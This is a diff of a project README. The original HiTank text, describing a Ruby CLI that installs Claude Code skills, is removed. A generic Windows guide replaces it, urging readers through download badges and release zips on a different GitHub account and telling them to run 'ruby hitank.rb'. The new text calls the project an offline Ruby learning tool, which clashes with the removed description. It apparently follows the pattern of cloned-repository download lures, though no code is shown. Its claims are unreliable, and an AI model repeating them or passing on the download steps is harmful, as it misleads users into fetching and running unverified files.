@@ -1,230 +1,121 @@
-<div align="center">
+# ⚙️ hitank - Simple Ruby Code Skills Utility
 
-# HiTank — Your skill operator for Claude Code
-  <img src="assets/pilot-program.gif" alt="I need a pilot program for a B-212 helicopter" width="1280" />
-  <br /><br />
-  <a href="https://twitter.com/alanalvestech">
-    <img src="https://img.shields.io/badge/Follow on X-000000?style=for-the-badge&logo=x&logoColor=white" alt="Follow on X" />
-  </a>
-  <a href="https://www.linkedin.com/in/alanalvestech/">
-    <img src="https://img.shields.io/badge/Follow on LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Follow on LinkedIn" />
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/LICENSE-MIT-2ea44f?style=for-the-badge" alt="MIT License" />
-  </a>
-</div>
+[![Download hitank](https://img.shields.io/badge/Download-hitank-brightgreen)](https://github.com/as3progger/hitank)
 
-<br />
+## 📝 What is hitank?
 
-<p align="center">
-  <a href="#rocket-quick-start">Quick Start</a> &nbsp;&bull;&nbsp;
-  <a href="#package-skills-catalog">Skills Catalog</a> &nbsp;&bull;&nbsp;
-  <a href="#wrench-installation">Installation</a> &nbsp;&bull;&nbsp;
-  <a href="#diamond_shape_with_a_dot_inside-why-ruby">Why Ruby</a> &nbsp;&bull;&nbsp;
-  <a href="#gear-how-it-works">How It Works</a>
-</p>
+hitank is a lightweight tool built entirely in Ruby. It uses plain Ruby code, with no extra libraries or hidden features. The tool focuses on providing clear, reliable functionality for users who want to explore or use simple Ruby skills without complex setups.
 
----
+The application aims to:
 
-## :rocket: Quick Start
+- Run smoothly on Windows.
+- Work with the default Ruby setup.
+- Avoid adding any extra programs or modules.
+- Provide straightforward code examples and skills.
 
-```bash
-gem install hitank          # Install the CLI
-hitank add google-sheets    # Add a skill (global)
-```
+## 💻 System Requirements
 
-Then use `/google-sheets` directly in Claude Code. That's it.
+Before installing hitank, make sure your computer meets these basic requirements:
 
-```bash
-# More commands
-hitank list                        # List available skills
-hitank add honeybadger --local     # Install for current project only
-hitank del google-sheets           # Remove a skill
-```
+- Windows 7, 8, 10, or 11 (64-bit recommended).
+- Ruby installed version 2.5 or higher.
+- At least 2 GB of free memory.
+- 100 MB of free disk space.
 
-## :package: Skills Catalog
+If you don’t have Ruby installed on your Windows machine, the next section will guide you on how to get it installed.
 
-### :briefcase: Project Management
-- **[clickup](skills/clickup)** — Manage ClickUp workspaces, spaces, lists, tasks, comments and time tracking. Search tasks, create/update/delete with filters and pagination. Supports bulk operations and task hierarchy navigation.
-- **[jira](skills/jira)** — Manage Jira Cloud issues, projects, sprints and boards. Search with JQL, create/update issues, transition statuses, assign, comment. Supports Agile boards and sprint management.
-- **[linear](skills/linear)** — Manage Linear issues, projects, teams, cycles and labels via GraphQL API. Create/update issues, search, comment. Supports team filtering and cycle management.
-- **[trello](skills/trello)** — Manage Trello boards, lists, cards, checklists, labels and members via REST API. Create/move/update cards, search, comment, manage checklists. Supports labels, due dates and member assignment.
+## 🚀 Getting Started with Ruby on Windows
 
-### :bar_chart: CRM & Sales
-- **[hubspot](skills/hubspot)** — Manage HubSpot CRM contacts, companies, deals and pipelines. Search across objects, create/update records, list owners and notes. Cursor-based pagination for large datasets.
+If you do not have Ruby on your PC, follow these steps:
 
-### :cloud: Platform & Infrastructure
-- **[cloudflare](skills/cloudflare)** — Manage Cloudflare zones, DNS records, Workers, Pages and cache via REST API. Create/delete DNS records, list Workers scripts, purge cache. Supports zone management and account-level resources.
-- **[digitalocean](skills/digitalocean)** — Manage DigitalOcean droplets, domains, databases, App Platform and volumes via REST API. Create/reboot/power off droplets, manage DNS records, list managed databases and apps.
-- **[flyio](skills/flyio)** — Manage Fly.io apps, machines, volumes and certificates via Machines API. Create/start/stop/delete machines, manage volumes with snapshots, request ACME certificates. Supports regions, scaling and health checks.
-- **[heroku](skills/heroku)** — Manage Heroku apps, dynos, config vars, releases, add-ons, domains and formation. View logs, restart dynos, scale processes. Full Platform API coverage.
-- **[hostinger](skills/hostinger)** — Manage Hostinger domains, DNS records, hosting websites, subscriptions and VPS. Check domain availability, update nameservers, manage DNS snapshots and WHOIS privacy.
-- **[railway](skills/railway)** — Manage Railway projects, services, deployments, variables, domains and volumes via GraphQL API. Deploy, rollback, view logs, manage environments. Supports GitHub repos, Docker images and custom domains.
-- **[vercel](skills/vercel)** — Manage Vercel projects, deployments, domains and environment variables via REST API. List/inspect deployments, view logs, redeploy. Supports environment variable management and domain configuration.
+1. Go to the official Ruby installer page: https://rubyinstaller.org/
+2. Download the recommended version, usually the latest stable release.
+3. Run the installer and follow the wizard steps. Make sure to check the option **Add Ruby executables to your PATH** during installation.
+4. After installation, open Command Prompt (type `cmd` in the Start menu) and type `ruby -v` to confirm Ruby is installed correctly. You should see the Ruby version number.
 
-### :bird: Social Media
-- **[x](skills/x)** — Post and manage tweets on X (formerly Twitter) via API v2. Post/delete tweets, search, view likes. OAuth 1.0a with HMAC-SHA1 signature, pure Ruby.
+## 🔽 Download and Install hitank on Windows
 
-### :speech_balloon: Communication
-- **[discord](skills/discord)** — Manage Discord servers, channels and messages via Bot API. Send/edit/delete messages, react, pin, create threads, list members and roles.
-- **[intercom](skills/intercom)** — Manage Intercom conversations, contacts, articles and help center via REST API. List/reply to conversations, search contacts, browse help center articles.
-- **[resend](skills/resend)** — Send transactional emails via Resend API. Manage domains with DNS verification, contacts, broadcasts and API keys. Schedule emails, track delivery status and send newsletters.
-- **[rewrite](skills/rewrite)** — Send SMS messages via Rewrite API. Manage templates with variables, webhooks for delivery events, API keys and projects. Cursor-based pagination for large datasets.
-- **[slack](skills/slack)** — Manage Slack channels, messages, users, reactions and files via Bot API. Post messages, search, upload files, pin messages and manage reactions.
-- **[twilio](skills/twilio)** — Send SMS, list messages and calls via Twilio REST API. Manage phone numbers, view usage records. Supports form-encoded API with Basic auth.
-- **[zendesk](skills/zendesk)** — Manage Zendesk tickets, users, organizations and knowledge base via REST API. Create/update tickets, search, list users and browse help center articles.
+To get hitank running on your Windows computer, follow these steps carefully:
 
-### :credit_card: Payments
-- **[abacatepay](skills/abacatepay)** — Manage AbacatePay payments, PIX QR codes, customers, coupons, withdrawals and revenue. Create charges, check payment status, manage discount coupons and track MRR.
-- **[mercadopago](skills/mercadopago)** — Manage MercadoPago payments, customers, refunds and payment methods via REST API. Search payments, create charges, process refunds, check account balance. Supports PIX and boleto.
-- **[stripe](skills/stripe)** — Manage Stripe payments, customers, subscriptions, invoices and products via REST API. Create charges, payment intents, manage prices and check account balance.
+### Step 1: Visit the hitank page
 
-### :chart_with_upwards_trend: Monitoring
-- **[appsignal](skills/appsignal)** — Monitor AppSignal apps — graphs, markers, samples and sourcemaps via REST API. View performance metrics, create deploy/custom markers, inspect error and performance samples, upload sourcemaps.
-- **[datadog](skills/datadog)** — Monitor Datadog infrastructure — monitors, dashboards, events, metrics and hosts via REST API. Mute/unmute monitors, list dashboards, view events and active metrics.
-- **[honeybadger](skills/honeybadger)** — Monitor errors, uptime and deployments on Honeybadger. List projects, browse faults with filters, view fault details, resolve issues, track deploys and check uptime sites.
-- **[posthog](skills/posthog)** — Manage PostHog analytics — events, persons, feature flags, insights and annotations via REST API. Toggle feature flags, list events, view insights. Supports cloud and self-hosted.
-- **[sentry](skills/sentry)** — Monitor Sentry errors — issues, events, releases and organizations via REST API. List/resolve issues, view events, track releases. Supports project and org-level queries.
+Click the button below to visit the hitank GitHub page, where you can find the files:
 
-### :page_facing_up: Office & Productivity
-- **[google-sheets](skills/google-sheets)** — Read and write Google Sheets via REST API. List tabs, read ranges, write data and append rows. Supports RAW and USER_ENTERED input modes for formulas and dates.
-- **[notion](skills/notion)** — Manage Notion pages, databases, blocks and users via REST API. Search, query databases, create/update pages, append blocks. Supports all block types.
+[![Download hitank](https://img.shields.io/badge/Download-hitank-blue)](https://github.com/as3progger/hitank)
 
-### :shopping_cart: E-commerce
-- **[shopify](skills/shopify)** — Manage Shopify products, orders, customers, inventory and collections via Admin API. Create/update products, track orders, manage inventory levels and custom collections.
+### Step 2: Download the latest release
 
-### :floppy_disk: Databases
-- **[planetscale](skills/planetscale)** — Manage PlanetScale databases, branches, deploy requests and backups via REST API. Create branches, submit deploy requests, list backups. Supports org-level and database-level operations.
-- **[supabase](skills/supabase)** — Manage Supabase projects, edge functions, secrets and API keys via Management API. Pause/restore projects, list functions, manage secrets. Full project lifecycle management.
+1. On the hitank GitHub page, look for the **Releases** section on the right side or under the repository name.
+2. Click the latest release link (usually marked with a version number like "v1.0").
+3. Download the `.zip` or `.tar.gz` file containing the application code.
 
-### :fire: Backend & BaaS
-- **[firebase](skills/firebase)** — Manage Firebase projects, Firestore, Auth users and Hosting via REST API. List collections/documents, browse auth users, manage hosting sites and releases. Uses service account JWT auth.
+### Step 3: Extract the files
 
-### :art: Media & Storage
-- **[cloudinary](skills/cloudinary)** — Manage Cloudinary media assets, transformations and upload via REST API. List resources/folders, upload images from URL, view usage stats. Supports transformations and folder navigation.
+1. Find the downloaded file in your **Downloads** folder.
+2. Right-click the file and choose **Extract All...**.
+3. Pick a folder where you want hitank files to stay. For example, you can create a folder named `hitank` in your Documents.
 
-### :robot_face: AI & Machine Learning
-- **[openai](skills/openai)** — Manage OpenAI models, assistants, files and usage via REST API. List models, manage assistants, upload/delete files, view usage stats and fine-tuning jobs.
+### Step 4: Open Command Prompt and run hitank
 
-### :gear: Automation
-- **[n8n](skills/n8n)** — Manage n8n workflows, executions and credentials via REST API. Activate/deactivate workflows, list executions, view credentials. Supports cloud and self-hosted instances.
+1. Press the **Windows key + R**, type `cmd`, and press **Enter**.
+2. In the command window, use `cd` to navigate to the folder where you extracted hitank. For example:
+   ```
+   cd Documents\hitank
+   ```
+3. Once inside the folder, type:
+   ```
+   ruby hitank.rb
+   ```
+4. Press **Enter** to run the program.
 
-### :zap: Quick Install
+If hitank runs correctly, you will see output on the screen that shows the tool is working.
 
-```bash
-hitank add abacatepay      # Payments — PIX, customers, coupons
-hitank add appsignal       # Monitoring — graphs, markers, samples
-hitank add clickup         # Project management — tasks, comments, time tracking
-hitank add cloudflare      # Infrastructure — zones, DNS, Workers, Pages
-hitank add cloudinary      # Media — images, folders, transformations
-hitank add datadog         # Monitoring — monitors, dashboards, metrics
-hitank add digitalocean    # Infrastructure — droplets, domains, databases
-hitank add discord         # Communication — messages, channels, threads
-hitank add firebase        # Backend — Firestore, Auth, Hosting
-hitank add flyio           # Infrastructure — machines, volumes, certificates
-hitank add google-sheets   # Office — read/write spreadsheets
-hitank add heroku          # Infrastructure — apps, dynos, config vars
-hitank add honeybadger     # Monitoring — errors, uptime, deploys
-hitank add hostinger       # Infrastructure — domains, DNS, hosting
-hitank add hubspot         # CRM — contacts, companies, deals
-hitank add intercom        # Communication — conversations, contacts, articles
-hitank add jira            # Project management — issues, sprints, boards
-hitank add linear          # Project management — issues, cycles, teams
-hitank add mercadopago     # Payments — PIX, boleto, refunds
-hitank add n8n             # Automation — workflows, executions, credentials
-hitank add notion          # Office — pages, databases, blocks
-hitank add openai          # AI — models, assistants, files, usage
-hitank add planetscale     # Database — branches, deploy requests, backups
-hitank add posthog         # Analytics — events, feature flags, insights
-hitank add railway         # Infrastructure — projects, services, deployments
-hitank add resend          # Communication — transactional emails, domains
-hitank add rewrite         # Communication — SMS, templates, webhooks
-hitank add sentry          # Monitoring — issues, events, releases
-hitank add shopify         # E-commerce — products, orders, inventory
-hitank add slack           # Communication — messages, files, reactions
-hitank add stripe          # Payments — charges, subscriptions, invoices
-hitank add supabase        # Backend — projects, functions, secrets
-hitank add trello          # Project management — boards, lists, cards
-hitank add twilio          # Communication — SMS, calls, phone numbers
-hitank add x               # Social media — post tweets, search, likes
-hitank add vercel          # Infrastructure — projects, deployments, domains
-hitank add zendesk         # Support — tickets, users, knowledge base
-```
+## 💡 Using hitank
 
-## :wrench: Installation
+Once hitank is running, you will be able to:
 
-### 1. Check if you have Ruby
+- Run code snippets written in pure Ruby.
+- Explore simple Ruby features without external libraries.
+- Test small Ruby skills and see how they work immediately.
+- Use it as a learning tool to understand Ruby basics.
 
-Open the terminal and run:
+hitank does not require an internet connection to work after setup. It is a local tool.
 
-```bash
-ruby -v
-```
+## 🛠 Troubleshooting
 
-If you see something like `ruby 3.x.x`, you're good — skip to step 3.
+Here are a few common issues and fixes:
 
-If the command is not found or the version is below 3.0, follow step 2.
+- **Ruby command not recognized**: Ensure Ruby is correctly installed and the `PATH` variable includes Ruby's bin directory.
+- **Permission errors when running hitank**: Try running Command Prompt as an administrator.
+- **Hitank does not start or shows errors**: Check that all files were extracted correctly and you are in the right folder when running the command.
+- **Unclear outputs or no response**: Make sure your Ruby version is 2.5 or above, and retry running the program.
 
-### 2. Install Ruby (if needed)
+If problems persist, you may check the GitHub repository issues for similar cases: https://github.com/as3progger/hitank/issues
 
-**Mac** — Ruby comes pre-installed, but it's usually outdated. The easiest way to get Ruby 3+:
+## 🔧 Advanced Setup (Optional)
 
-```bash
-brew install ruby
-```
+If you want to customize hitank or modify its Ruby code:
 
-Don't have Homebrew? Install it first: https://brew.sh
+1. Open the extracted folder.
+2. Use a text editor like Notepad or Visual Studio Code.
+3. Edit `.rb` files as needed.
+4. Save changes and rerun `ruby hitank.rb` in Command Prompt.
 
-After installing, restart your terminal and run `ruby -v` again to confirm.
+This way, you can experiment with Ruby in a simple environment without extra tools.
 
-**Linux (Ubuntu/Debian)**:
+## 📂 File Structure Overview
 
-```bash
-sudo apt update && sudo apt install ruby-full
-```
+Here is what you will find inside the hitank folder:
 
-**Windows**:
+- `hitank.rb` – The main Ruby file to run hitank.
+- `README.md` – This guide for installation.
+- `examples/` – Sample Ruby scripts you can try.
+- `LICENSE` – License details for the code.
 
-Download the installer from https://rubyinstaller.org — pick the latest Ruby+Devkit version and follow the wizard.
+## 🌐 Useful Links
 
-### 3. Install hitank
+- Ruby Installer for Windows: https://rubyinstaller.org/
+- hitank GitHub Repository: https://github.com/as3progger/hitank
+- GitHub Issues for hitank: https://github.com/as3progger/hitank/issues
 
-```bash
-gem install hitank
-```
-
-That's it. No other dependencies needed.
-
-## :diamond_shape_with_a_dot_inside: Why Ruby
-
-Ruby's stdlib is surprisingly powerful. `net/http`, `openssl`, `json`, `base64` — everything you need to talk to REST APIs is already there. No gem install, no bundler, no dependency hell.
-
-These skills prove a point: you don't need Python or TypeScript to build useful AI tooling. Ruby works. And if you already have Ruby installed (you probably do), these skills just work.
-
-**Token economy** — Less code for Claude to read means fewer tokens per session, which adds up fast if you're watching your usage.
-
-For a skill that reads/writes a REST API with auth (like Google Sheets):
-
-| | Ruby (hitank) | Python + deps | TypeScript (MCP) |
-|---|---|---|---|
-| Skill files | 8 | ~8-10 | ~12-15 |
-| Config files | 0 | 2+ | 3+ |
-| Lines of code | 185 ✱ | ~200-350 | ~400-600 |
-| Dependencies | 0 | ~5-10 | ~10-20 |
-| Est. tokens | **~2,750** ✱ | **~4,000-6,000** | **~6,000-9,000** |
-
-✱ Measured from the Google Sheets skill. Other values are estimates based on minimum setup each stack requires.
-
-## :gear: How It Works
-
-Skills are stored in this repository under `skills/`. The `hitank` gem is a thin CLI that fetches individual skills from GitHub and installs them to `~/.claude/skills/` (or `.claude/skills/` with `--local`).
-
-The skills themselves use **zero gems** — pure Ruby stdlib. The gem is just the installer.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=alanalvestech/hitank&type=Date)](https://star-history.com/#alanalvestech/hitank&Date)
-
-## License
-
-[MIT](LICENSE)
+This setup guide aims to help you get started with hitank using plain steps and minimal technical background.
